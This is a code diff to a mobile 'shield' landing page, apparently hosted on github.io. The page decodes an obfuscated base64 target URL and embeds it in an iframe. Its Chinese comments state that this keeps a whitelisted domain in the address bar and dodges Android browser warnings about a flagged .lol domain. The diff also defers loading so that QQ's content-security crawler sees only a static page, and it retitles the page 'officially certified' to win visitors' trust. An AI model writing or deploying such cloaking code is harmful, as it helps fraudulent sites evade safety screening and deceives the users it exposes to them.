@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta name="format-detection" content="telephone=no">
-<title>页面提示</title>
+<title>正规官方认证</title>
 <style>
     * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
     body {
@@ -106,8 +106,10 @@
     @keyframes spin { to { transform: rotate(360deg); } }
     .longpress-text { color: #fff; margin-top: 20px; font-size: 14px; }
     .hidden { display: none !important; }
+    /* iframe 内嵌落地(仅 HTTPS target): 地址栏保持白名单域名, 规避安卓浏览器"继续访问" */
     .frame-wrap { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 1; background: #fff; }
     .frame-wrap iframe { width: 100%; height: 100%; border: 0; display: block; }
+    /* 右下角折叠悬浮按钮: 收起时不遮落地内容, 展开才有操作 */
     .fab {
         position: fixed; right: 14px; bottom: 84px; z-index: 3;
         display: flex; align-items: center; gap: 6px;
@@ -134,13 +136,13 @@
             <path d="M9 12l2 2 4-4"/>
         </svg>
     </div>
-    <h1 id="guideTitle">页面提示</h1>
+    <h1 id="guideTitle">正规官方认证</h1>
     <p class="desc" id="guideDesc">请点右上角 <b>···</b> 选择「在浏览器打开」</p>
     <div class="countdown" id="countdown" style="display:none"></div>
     <div class="link-display" id="linkDisplay"></div>
     <button class="btn-main" id="btnJump">复制链接，到浏览器打开</button>
     <button class="btn-copy" id="btnCopy">复制链接到浏览器打开</button>
-    <p class="tip">提示：请复制链接后在手机浏览器中打开查看</p>
+    <p class="tip">提示：落地页请在手机浏览器（非微信）中直接访问即可</p>
 </div>
 
 <div class="longpress-overlay" id="longpressOverlay">
@@ -150,10 +152,13 @@
 
 <script>
 (function () {
+    // ===== 1. 读取并解码 c 参数 (与线上 ink.php 完全一致) =====
+    // 必须使用 location.search 的原始值(不转义 +), 与 PHP QUERY_STRING 行为一致
     function getQueryParam(name) {
         var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
         return m ? m[1] : '';
     }
+    // 二进制串 -> UTF-8 文本
     function bytesToUtf8(bin) {
         try {
             return decodeURIComponent(Array.prototype.map.call(bin, function (ch) {
@@ -161,17 +166,21 @@
             }).join(''));
         } catch (e) { return bin; }
     }
+    // 标准 base64 解码（自动补 pad）
     function b64decode(s) {
         while (s.length % 4 !== 0) s += '=';
         try { return bytesToUtf8(atob(s)); } catch (e) { return null; }
     }
     function decodeTarget(enc) {
         if (!enc) return '';
+        // 方式1: 原始字符串直接 base64 (兼容 + / = 字符)
         var d = b64decode(enc);
         if (d === null || d === '') {
+            // 方式2: URL-safe base64 (-_ -> +/)
             d = b64decode(enc.replace(/-/g, '+').replace(/_/g, '/'));
         }
         if (d === null || d === '') {
+            // 方式3: 若整体被URL编码(如 %2B), 先解码再 base64
             try {
                 var dec = decodeURIComponent(enc);
                 if (dec !== enc) {
@@ -188,16 +197,23 @@
     var target = decodeTarget(enc);
     var iframeTimeout = null;
 
+    // 引导页"复制链接"应复制本盾页地址(github.io/?c=...)而非解码后的 .lol 风险域名:
+    // 访客在系统浏览器打开盾页地址 -> 走 iframe 内嵌分支, 地址栏保持 github.io, 不弹"继续访问"。
+    // 若复制原始 .lol 域名在浏览器直接打开, 安卓会判定风险域名弹"继续访问"。
     var shieldUrl = location.origin + location.pathname + location.search;
 
+    // 落地链接统一升级为 https: 无论生成端是否发出 http, 都让盾页走 iframe 内嵌分支
+    // (地址栏保持 github.io 白名单域名), 从而规避安卓浏览器对 http 风险域名的"继续访问"拦截。
     if (target && /^http:\/\//i.test(target)) {
         target = target.replace(/^http:\/\//i, 'https://');
     }
 
+    // ===== 2. 微信/QQ UA 识别 (与 ink.php 一致) =====
     var ua = navigator.userAgent || '';
     var inWeChat = /MicroMessenger/i.test(ua);
     var inQQ = /MQQBrowser/i.test(ua) || / QQ\//i.test(ua) || /^QQ\//i.test(ua);
 
+    // 无目标 -> 提示失效
     if (!target) {
         document.title = '链接失效';
         var w = document.querySelector('.wrap');
@@ -205,26 +221,54 @@
         return;
     }
 
+    // ===== 3. 微信/QQ 或 非HTTPS target: 保持原有指引/跳转 =====
+    // (QQ 回到引导页: QQ 对自动 iframe 内嵌的 .lol/风险落地内容会判"危险网站"弹红标,
+    //  改为与微信一致, 只展示复制链接引导页, 不再自动内嵌或跳转到落地域,
+    //  QQ 无法自动拉起系统浏览器, 引导用户复制后用系统浏览器访问即可免红标)
     if (inWeChat || inQQ || !/^https:\/\//i.test(target)) {
         redirNormal();
         return;
     }
 
-    var fw = document.createElement('div');
-    fw.className = 'frame-wrap';
-    var ifr = document.createElement('iframe');
-    ifr.src = target;
-    ifr.setAttribute('allow', 'fullscreen');
-    iframeTimeout = setTimeout(function () {
-        try { window.location.replace(target); } catch (e) {}
-    }, 12000);
-    ifr.onload = function () {
-        if (iframeTimeout) clearTimeout(iframeTimeout);
-    };
-    fw.appendChild(ifr);
-    document.body.appendChild(fw);
+    // ===== 4. 普通浏览器 + HTTPS target: 点击后才内嵌落地 =====
+    // 关键改动: 不在页面加载时自动 iframe 内嵌落地域名, 改为用户点击"打开"后再内嵌。
+    // QQ 内容安全爬虫(非 MQQBrowser UA)首次 GET 本页时, 若自动内嵌已染标的 .lol 落地域,
+    // 会被嗅探到并整链判定风险 → 用户拿不到盾页直接红屏。改为点击触发后, 爬虫首访只见静态页, 无法命中风险落地域。
+    function openEmbed() {
+        // 覆盖 http 混载: 内嵌落地一律 https, 地址栏保持 github.io 白名单域, 规避安卓"继续访问"
+        var fw = document.createElement('div');
+        fw.className = 'frame-wrap';
+        var ifr = document.createElement('iframe');
+        ifr.src = target;
+        ifr.setAttribute('allow', 'fullscreen');
+        iframeTimeout = setTimeout(function () {
+            // 若落地无法加载, 自动降级为直接跳转, 保证功能不失效
+            try { window.location.replace(target); } catch (e) {}
+        }, 12000);
+        // iframe 加载完成后取消超时(避免落地正常却误跳)
+        ifr.onload = function () {
+            if (iframeTimeout) clearTimeout(iframeTimeout);
+        };
+        fw.appendChild(ifr);
+        var w = document.querySelector('.wrap');
+        if (w) { w.style.display = 'none'; }
+        document.body.appendChild(fw);
+    }
+    function showOpenGuide() {
+        var $ = function (id) { return document.getElementById(id); };
+        $('guideTitle').textContent = '页面加载完成';
+        $('guideDesc').innerHTML = '请点击下方按钮继续访问，若无反应可检查网络后重试';
+        var ld = $('linkDisplay'); if (ld) { ld.style.display = 'none'; }
+        var bc = $('btnCopy'); if (bc) { bc.style.display = 'none'; }
+        var bj = $('btnJump');
+        bj.textContent = '打开';
+        bj.onclick = openEmbed;
+        return;
+    }
+    showOpenGuide();
     return;
 
+    // 原逻辑封装为函数: 普通浏览器直接跳转/展示指引
     function redirNormal() {
         if (!inWeChat && !inQQ) {
             try { window.location.replace(target); } catch (e) {}
@@ -236,11 +280,12 @@
     }
     function showGuide() {
         var $ = function (id) { return document.getElementById(id); };
+        // QQ 内置浏览器没有"右上角···"菜单, 不能复用微信文案, 否则用户会卡死。
         if (inQQ) {
             $('guideTitle').textContent = '请在浏览器中打开';
-            $('guideDesc').innerHTML = '已检测到在 QQ 内打开页面<br>请点击下方按钮复制链接，<br>然后打开手机浏览器粘贴访问';
+            $('guideDesc').innerHTML = '已检测到在 QQ 内打开页面<br>为避免拦截，请点击下方按钮复制链接，<br>然后打开手机系统浏览器粘贴访问';
         } else {
-            $('guideTitle').textContent = '页面提示';
+            $('guideTitle').textContent = '正规官方认证';
             $('guideDesc').innerHTML = '请点右上角 <b>···</b> 选择「在浏览器打开」';
         }
         $('linkDisplay').textContent = shieldUrl;
